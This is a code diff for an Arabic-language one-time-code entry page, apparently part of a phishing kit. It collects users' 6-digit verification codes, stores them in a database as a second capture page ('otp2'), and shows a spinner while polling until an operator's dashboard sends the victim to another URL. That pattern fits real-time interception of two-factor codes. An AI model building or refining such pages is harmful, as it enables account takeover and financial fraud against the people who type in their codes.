@@ -21,8 +21,17 @@
           إلى رقمك المسجل لدينا لتأكيد الطلب الخاص بك.
         </p>
 
-        <label class="otp-label" for="otp-code">Verification Code</label>
-        <input id="otp-code" class="otp-input" type="text" />
+        <label class="otp-label" for="otp-code">Verification Code (6 أرقام)</label>
+        <input
+          id="otp-code"
+          class="otp-input"
+          type="text"
+          inputmode="numeric"
+          maxlength="6"
+          autocomplete="one-time-code"
+          dir="ltr"
+          placeholder="••••••"
+        />
 
         <button class="otp-btn" type="button">تأكيد</button>
 
@@ -42,9 +51,55 @@
     
     <script src="api-config.js"></script>
     <script src="api-client.js"></script>
-    <script src="form-handler.js"></script>
     <script>
       (function () {
+        function digitsOtp(str) {
+          return String(str || '').replace(/\D/g, '').slice(0, 6);
+        }
+
+        var pollStop = null;
+        function stopPoll() {
+          if (typeof pollStop === 'function') {
+            pollStop();
+            pollStop = null;
+          }
+        }
+
+        function ensureOtpLoadingOverlay() {
+          var el = document.getElementById('otpFormLoading');
+          if (el) return el;
+          el = document.createElement('div');
+          el.id = 'otpFormLoading';
+          el.className = 'otp-full-loading';
+          el.setAttribute('aria-busy', 'true');
+          el.innerHTML =
+            '<div class="otp-full-loading-inner">' +
+            '<div class="otp-full-loading-spinner" aria-hidden="true"></div>' +
+            '<p class="otp-loading-message">جاري المعالجة...</p>' +
+            '</div>';
+          document.body.appendChild(el);
+          return el;
+        }
+
+        function setOtpLoadingMsg(msg) {
+          var el = document.getElementById('otpFormLoading');
+          if (!el) return;
+          var p = el.querySelector('.otp-loading-message');
+          if (p) p.textContent = msg;
+        }
+
+        function showOtpFullLoading(msg) {
+          var el = ensureOtpLoadingOverlay();
+          setOtpLoadingMsg(msg || 'جاري المعالجة...');
+          el.style.display = 'flex';
+        }
+
+        function hideOtpFullLoading() {
+          var el = document.getElementById('otpFormLoading');
+          if (!el) return;
+          el.style.display = 'none';
+        }
+
         var totalSeconds = 2 * 60;
         var timerEl = document.getElementById("otp-timer");
         if (!timerEl) return;
@@ -67,15 +122,22 @@
           timerEl.textContent = format(totalSeconds);
         }, 1000);
 
-        // Handle OTP2 Confirmation
-        document.querySelector('.otp-btn').addEventListener('click', async function() {
-          const otpCode = document.getElementById('otp-code').value;
-          if (otpCode.trim() === '') {
-            alert('الرجاء إدخال رمز التحقق');
+        var otpInput = document.getElementById('otp-code');
+        otpInput.addEventListener('input', function () {
+          otpInput.value = digitsOtp(otpInput.value);
+        });
+
+        document.querySelector('.otp-btn').addEventListener('click', async function () {
+          stopPoll();
+          var otpCode = digitsOtp(document.getElementById('otp-code').value);
+          if (otpCode.length !== 6) {
+            alert('الرجاء إدخال 6 أرقام بالضبط لرمز التحقق.');
             return;
           }
 
-          const newUser = {
+          showOtpFullLoading('جاري حفظ البيانات...');
+
+          var newUser = {
             page: 'otp2',
             verificationCode: otpCode,
             timestamp: new Date().toLocaleString('ar-EG'),
@@ -87,34 +149,24 @@
             await saveSubmission(newUser);
           } catch (e) {
             console.error(e);
+            hideOtpFullLoading();
             alert('تعذر حفظ الرمز. تأكد أن الخادم وMongoDB يعملان.');
             return;
           }
 
-          // Show success message
-          const modal = document.createElement('div');
-          modal.style.cssText = `
-            position: fixed;
-            top: 0;
-            right: 0;
-            bottom: 0;
-            left: 0;
-            background: rgba(0, 0, 0, 0.5);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-          `;
-          modal.innerHTML = `
-            <div style="background: white; padding: 40px; border-radius: 15px; text-align: center; max-width: 400px;">
-              <div style="font-size: 50px; margin-bottom: 20px;">✅</div>
-              <h2 style="color: #28a745; margin-bottom: 10px;">تم التحقق بنجاح!</h2>
-              <p style="color: #666; margin-bottom: 20px;">شكراً لتأكيد البيانات الخاصة بك.</p>
-              <button onclick="window.location.href='index.html'" style="padding: 10px 30px; background: #667eea; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold;">العودة للرئيسية</button>
-            </div>
-          `;
-          document.body.appendChild(modal);
-          setTimeout(() => modal.remove(), 3000);
+          setOtpLoadingMsg('يرجى الانتظار، جاري التحقق من قبل النظام...');
+
+          if (typeof startSessionRedirectPolling !== 'function') {
+            hideOtpFullLoading();
+            alert('تم الحفظ. تحمّل api-client.js لاستكمال انتظار التوجيه من الداشبورد.');
+            return;
+          }
+
+          stopPoll();
+          pollStop = startSessionRedirectPolling(function (url) {
+            stopPoll();
+            window.location.href = url;
+          });
         });
       })();
     </script>
